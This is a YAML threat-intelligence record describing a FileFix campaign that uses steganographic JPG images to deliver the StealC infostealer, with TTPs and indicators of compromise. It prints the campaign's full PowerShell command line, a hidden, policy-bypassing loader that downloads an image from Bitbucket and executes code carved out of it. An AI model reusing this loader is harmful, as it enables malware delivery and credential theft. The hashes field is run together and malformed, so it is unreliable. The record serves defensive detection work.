@@ -1,0 +1,49 @@
+description: "A sophisticated FileFix campaign leveraging steganography in JPG images\
+  \ to deliver a multi\u2011stage PowerShell payload that extracts and executes an\
+  \ encrypted Go loader which deploys the StealC infostealer."
+attribution: Unknown threat actor, no specific APT group or country identified
+malware_families:
+- StealC
+TTPs:
+  processes: []
+  commandline:
+  - '''PowerShell -noP -W H -ep Bypass -C "$if=[System.IO.File];$ifr=$if::ReadAllBytes;$ifw=$if::WriteAllBytes;$e=[System.Text.Encoding]::UTF8;$c=[System.Convert];$egb=$e.GetBytes;$egs=$e.GetString;$cf=$c::FromBase64String;$ct=$c::ToBase64String;$u=''hxxps[://]bitbucket[.]org/pibejiloiza/pi73/raw/4e2ff4d859e04af8d01fd961ab56163736a731f9/pexels-willianmatiola-33593998-3[.]jpg'';$egs.Invoke($cf.Invoke(''JHBfZmlzdD0tam9pbigkZW52OlRFTVAsJ1x6ZDc0NmYxY2UxYzAuanBnJyk7SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtTWV0aG9kIEdldCAtT3V0RmlsZSAkcF9maXN0IC1FcnJvckFjdGlvbiBJZ25vcmU7CiRpbWFnZV9ieXRlcz0kaWZyLkludm9rZSgkcF9maXN0KTskcF9ieXRlcz0kaW1hZ2VfYnl0ZXNbMTEwMTI1My4uKCRpbWFnZV9ieXRlcy5MZW5ndGgtMSldOyRlLkdldFN0cmluZygkcF9ieXRlcyl8aWV4Ow==''))|iex;$z=''
+    C:\\Users\\Default\\Documents\\Meta\\Facebook\\Shared\\Incident_reported.pdf''"'
+  powershell:
+  - $if=[System.IO.File];$ifr=$if::ReadAllBytes;$ifw=$if::WriteAllBytes;$e=[System.Text.Encoding]::UTF8;$c=[System.Convert];$egb=$e.GetBytes;$egs=$e.GetString;$cf=$c::FromBase64String;$ct=$c::ToBase64String;$u='hxxps[://]bitbucket[.]org/pibejiloiza/pi73/raw/4e2ff4d859e04af8d01fd961ab56163736a731f9/pexels-willianmatiola-33593998-3[.]jpg';$egs.Invoke($cf.Invoke('JHBfZmlzdD0tam9pbigkZW52OlRFTVAsJ1x6ZDc0NmYxY2UxYzAuanBnJyk7SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtTWV0aG9kIEdldCAtT3V0RmlsZSAkcF9maXN0IC1FcnJvckFjdGlvbiBJZ25vcmU7CiRpbWFnZV9ieXRlcz0kaWZyLkludm9rZSgkcF9maXN0KTskcF9ieXRlcz0kaW1hZ2VfYnl0ZXNbMTEwMTI1My4uKCRpbWFnZV9ieXRlcy5MZW5ndGgtMSldOyRlLkdldFN0cmluZygkcF9ieXRlcyl8aWV4Ow=='))|iex;$z='
+    C:\\Users\\Default\\Documents\\Meta\\Facebook\\Shared\\Incident_reported.pdf'
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: PowerShell
+    destination: bitbucket.org
+    url: https://bitbucket.org/pibejiloiza/pi73/raw/4e2ff4d859e04af8d01fd961ab56163736a731f9/pexels-willianmatiola-33593998-3.jpg
+    port: 443
+  file_activity:
+  - C:\\Users\\Default\\Documents\\Meta\\Facebook\\Shared\\Incident_reported.pdf
+  persistence: []
+  process_relations: []
+IOCs:
+  domains:
+  - bitbucket.org
+  - elprogresofood.com
+  - facebook.meta-software-worldwide.com
+  - facebook.windows-software-downloads.com
+  - facebook.windows-software-updates.cc
+  - mastercompu.com
+  - thanjainatural.com
+  - bitbucket.org/pibejiloiza/Bitbucket
+  - bitbucket.org/brubroddagrofe/Bitbucket
+  - bitbucket.org/creyaucuronna-4413/Grabify.link/5M6TOW===
+  urls:
+  - https://bitbucket.org/pibejiloiza/pi73/raw/4e2ff4d859e04af8d01fd961ab56163736a731f9/pexels-willianmatiola-33593998-3.jpg
+  hashes:
+  - 70AE293EB1C023D40A8A48D6109A1BF792E1877A72433BCC89613461CFFC7B6106471E1F500612F44C828E5D3453E7846F70C2D83B24C08AC9193E791F1A813008FD6813F58DA707282915139DB973B2DBE79C11DF22AD25C99EC5C8406B234A2654D6F8D6C93C7AF7B7B31A89EBF58348A349AA943332EBB39CE552DDE81FC8FD30A2C90384BDB266971A81F97D80A2C42B4CEC5762854224E1BC5C006D007A1D9543F7C0039F6F44C714FE8D8FD0A3F6D52FCAE2A70B4BC442F38E01E140721801DA172FAE83CEE2CC7C02F63E52D71F892D78E547A13718F146D5365F047C7022F91F0534D980A4D77DF20BEA1AE53EE02F7C490EFBFAE605961F5170A580B3CE10CC997CD60A48A01677A152E21D4AA36AB5B2FD3718C04EDEF62662CEA1IP77
+  ips:
+  - 77.90.153.225
+authors:
+- Eliad Kimhy
+reference: https://www.acronis.com/en/tru/posts/filefix-in-the-wild-new-filefix-campaign-goes-beyond-poc-and-leverages-steganography
+date_of_publication: October 01, 2025
+file_creation_date: October 01, 2025
